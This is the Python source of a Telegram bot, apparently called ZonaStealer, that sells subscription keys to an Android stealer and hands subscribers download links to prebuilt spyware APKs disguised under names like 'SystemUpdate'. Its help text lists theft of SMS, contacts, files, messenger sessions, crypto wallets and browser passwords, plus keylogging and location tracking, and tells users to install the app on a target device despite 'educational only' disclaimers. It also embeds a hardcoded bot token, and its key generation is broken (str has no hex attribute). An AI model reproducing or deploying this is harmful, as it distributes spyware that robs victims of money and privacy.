import telebot
from telebot import types
import json
import uuid
import time
import threading
from datetime import datetime
import requests
import os

# ================= КОНФИГ =================
TOKEN = '8364189800:AAHHsHHgKZ7oB6XSHExPWn0-0G5Fp8fGNi4'
ADMIN_ID = 7725796090
bot = telebot.TeleBot(TOKEN)

# ================= БАЗА ДАННЫХ (JSON файл) =================
DB_FILE = 'database.json'

def load_db():
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {
            'users': {},
            'keys': {},
            'builds': {},
            'stats': {'total_builds': 0, 'total_users': 0}
        }

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

# ================= КОМАНДЫ =================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = str(message.from_user.id)
    db = load_db()
    
    if user_id == str(ADMIN_ID):
        # Админ меню
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row('🔑 Создать ключ', '📊 Статистика')
        markup.row('👥 Пользователи', '📦 Билды')
        bot.send_message(message.chat.id, 
            "👑 *Админ панель ZonaStealer*\n\n"
            "Выберите действие:",
            parse_mode='Markdown',
            reply_markup=markup)
    else:
        # Проверка подписки
        user = db['users'].get(user_id)
        if user and user.get('expiry', 0) > time.time():
            expiry = datetime.fromtimestamp(user['expiry']).strftime('%d.%m.%Y')
            
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            markup.row('📱 Создать стиллер', 'ℹ️ Помощь')
            
            bot.send_message(message.chat.id,
                f"✅ *Подписка активна до {expiry}*\n\n"
                f"Используйте кнопки ниже:",
                parse_mode='Markdown',
                reply_markup=markup)
        else:
            bot.send_message(message.chat.id,
                "❌ *Нет активной подписки*\n\n"
                "Введите ключ доступа (12 символов):",
                parse_mode='Markdown',
                reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(func=lambda m: m.text == '🔑 Создать ключ' and str(m.from_user.id) == str(ADMIN_ID))
def create_key_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        types.InlineKeyboardButton("1 день", callback_data="key_1"),
        types.InlineKeyboardButton("7 дней", callback_data="key_7"),
        types.InlineKeyboardButton("30 дней", callback_data="key_30"),
        types.InlineKeyboardButton("90 дней", callback_data="key_90"),
        types.InlineKeyboardButton("Свой срок", callback_data="key_custom")
    )
    bot.send_message(message.chat.id, "Выберите срок действия ключа:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('key_'))
def generate_key(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Доступно только админу")
        return
    
    if call.data == 'key_custom':
        msg = bot.send_message(call.message.chat.id, "Введите количество дней:")
        bot.register_next_step_handler(msg, process_custom_key)
        bot.answer_callback_query(call.id)
        return
    
    days = int(call.data.split('_')[1])
    key = str(uuid.uuid4()).hex[:12].upper()
    
    db = load_db()
    db['keys'][key] = {
        'days': days,
        'created': time.time(),
        'used': False
    }
    save_db(db)
    
    bot.send_message(call.message.chat.id,
        f"✅ *Ключ создан*\n\n"
        f"🔑 `{key}`\n"
        f"⏳ Срок: *{days} дней*\n\n"
        f"Перешлите этот ключ пользователю.",
        parse_mode='Markdown')
    bot.answer_callback_query(call.id)

def process_custom_key(message):
    try:
        days = int(message.text)
        if days <= 0:
            bot.send_message(message.chat.id, "❌ Число должно быть больше 0")
            return
        
        key = str(uuid.uuid4()).hex[:12].upper()
        db = load_db()
        db['keys'][key] = {
            'days': days,
            'created': time.time(),
            'used': False
        }
        save_db(db)
        
        bot.send_message(message.chat.id,
            f"✅ *Ключ создан*\n\n"
            f"🔑 `{key}`\n"
            f"⏳ Срок: *{days} дней*",
            parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "❌ Неверный формат")

# Активация ключа
@bot.message_handler(func=lambda m: len(m.text) == 12 and m.text.isupper())
def activate_key(message):
    user_id = str(message.from_user.id)
    key = message.text.upper()
    
    db = load_db()
    
    if key in db['keys'] and not db['keys'][key]['used']:
        days = db['keys'][key]['days']
        expiry = time.time() + (days * 86400)
        
        db['users'][user_id] = {
            'expiry': expiry,
            'plan': f'{days} дней',
            'activated': time.time(),
            'builds': []
        }
        
        db['keys'][key]['used'] = True
        db['stats']['total_users'] = len(db['users'])
        save_db(db)
        
        expiry_date = datetime.fromtimestamp(expiry).strftime('%d.%m.%Y %H:%M')
        
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row('📱 Создать стиллер', 'ℹ️ Помощь')
        
        bot.send_message(message.chat.id,
            f"✅ *Ключ активирован!*\n\n"
            f"🔑 Ключ: `{key}`\n"
            f"⏳ Срок: {days} дней\n"
            f"📅 Действует до: {expiry_date}\n\n"
            f"Теперь вы можете создавать стиллеры.",
            parse_mode='Markdown',
            reply_markup=markup)
    else:
        bot.send_message(message.chat.id,
            "❌ *Неверный или использованный ключ*\n\n"
            "Купить новый ключ: @ZonatTag",
            parse_mode='Markdown')

# Создание стиллера
@bot.message_handler(func=lambda m: m.text == '📱 Создать стиллер')
def create_stiller(message):
    user_id = str(message.from_user.id)
    db = load_db()
    
    user = db['users'].get(user_id)
    if not user or user['expiry'] < time.time():
        bot.send_message(message.chat.id, "❌ Нет активной подписки")
        return
    
    msg = bot.send_message(message.chat.id,
        "📱 *Создание стиллера*\n\n"
        "Введите Telegram ID для получения логов:\n"
        "Пример: `1234567890`",
        parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_log_id)

def process_log_id(message):
    try:
        log_id = int(message.text)
        if len(str(log_id)) < 5:
            bot.send_message(message.chat.id, "❌ Неверный ID")
            return
        
        msg = bot.send_message(message.chat.id,
            "✏️ Введите название приложения:\n"
            "Пример: `SystemUpdate`",
            parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_app_name, log_id)
    except:
        bot.send_message(message.chat.id, "❌ Введите только цифры")

def process_app_name(message, log_id):
    app_name = message.text.strip().replace(' ', '_')[:20]
    user_id = str(message.from_user.id)
    
    # Готовые APK ссылки (заранее залитые)
    APK_FILES = {
        'basic': 'https://github.com/yourusername/stealer-repo/raw/main/stealer_basic.apk',
        'advanced': 'https://transfer.sh/stealer_advanced.apk',
        'full': 'https://anonfiles.com/full_stealer.apk'
    }
    
    # Выбираем APK
    apk_url = APK_FILES['advanced']
    
    # Отправляем APK
    bot.send_message(message.chat.id,
        f"✅ *Стиллер готов!*\n\n"
        f"📱 Название: `{app_name}`\n"
        f"📨 Логи на ID: `{log_id}`\n"
        f"🔗 Скачать: [ссылка]({apk_url})\n\n"
        f"*Функции:*\n"
        f"• Контакты и SMS\n• Фото и файлы\n• Соцсети (Telegram, WhatsApp)\n"
        f"• Крипто-кошельки\n• Пароли браузеров\n• Кейлоггер\n\n"
        f"⚠️ Только для образовательных целей!",
        parse_mode='Markdown',
        disable_web_page_preview=True)
    
    # Обновляем статистику
    db = load_db()
    db['stats']['total_builds'] += 1
    save_db(db)

# Статистика
@bot.message_handler(func=lambda m: m.text == '📊 Статистика' and str(m.from_user.id) == str(ADMIN_ID))
def show_stats(message):
    db = load_db()
    stats = db['stats']
    
    text = (
        f"📊 *Статистика*\n\n"
        f"👥 Пользователей: {stats.get('total_users', 0)}\n"
        f"📦 Создано стиллеров: {stats.get('total_builds', 0)}\n"
        f"🔑 Ключей в базе: {len(db['keys'])}\n\n"
        f"🔄 Бот работает с: 2024.01.01"
    )
    
    bot.send_message(message.chat.id, text, parse_mode='Markdown')

# Помощь
@bot.message_handler(func=lambda m: m.text == 'ℹ️ Помощь')
def help_command(message):
    text = (
        "📱 *ZonaStealer Builder*\n\n"
        "*Функции стиллера:*\n"
        "1. Сбор контактов и SMS\n"
        "2. Фотографии и файлы\n"
        "3. Сессии соцсетей\n"
        "4. Крипто-кошельки\n"
        "5. Пароли браузеров\n"
        "6. Кейлоггер\n"
        "7. Локация\n\n"
        "*Как использовать:*\n"
        "1. Активируйте ключ\n"
        "2. Создайте стиллер\n"
        "3. Укажите ID для логов\n"
        "4. Получите APK\n"
        "5. Установите на целевое устройство\n\n"
        "⚠️ Только для тестирования!"
    )
    
    bot.send_message(message.chat.id, text, parse_mode='Markdown')

# ================= ЗАПУСК БОТА =================
def run_bot():
    print("🤖 Бот запущен...")
    print(f"👑 Админ ID: {ADMIN_ID}")
    bot.infinity_polling(timeout=30, long_polling_timeout=30)

if __name__ == '__main__':
    # Создаем файл базы данных если нет
    if not os.path.exists(DB_FILE):
        save_db({
            'users': {},
            'keys': {},
            'builds': {},
            'stats': {'total_builds': 0, 'total_users': 0}
        })
    
    run_bot()
